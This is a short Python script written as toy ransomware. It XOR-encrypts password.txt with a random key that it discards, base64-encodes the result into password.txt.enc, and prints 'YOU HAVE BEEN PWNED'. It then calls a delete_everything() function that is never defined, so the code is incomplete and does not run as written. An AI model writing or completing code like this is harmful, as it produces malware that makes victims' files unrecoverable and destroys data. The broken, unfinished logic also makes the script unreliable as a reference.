from random import randint
import base64

def cryptolock_everthing():
    key = randint(0,256)
    with open("password.txt") as f:
        to_encrypt = f.read()
        encrypted = "".join([chr(ord(l)^key) for l in to_encrypt])
        encrypted = base64.b64encode(bytes(encrypted, 'utf-8')).decode('utf-8')
        outfile = open("password.txt.enc", 'w')
        outfile.write(encrypted)


def main():
    print("###################")
    print('YOU HAVE BEEN PWNED')
    print("###################")

    cryptolock_everthing()
    delete_everything()

if __name__ == "__main__":
    main()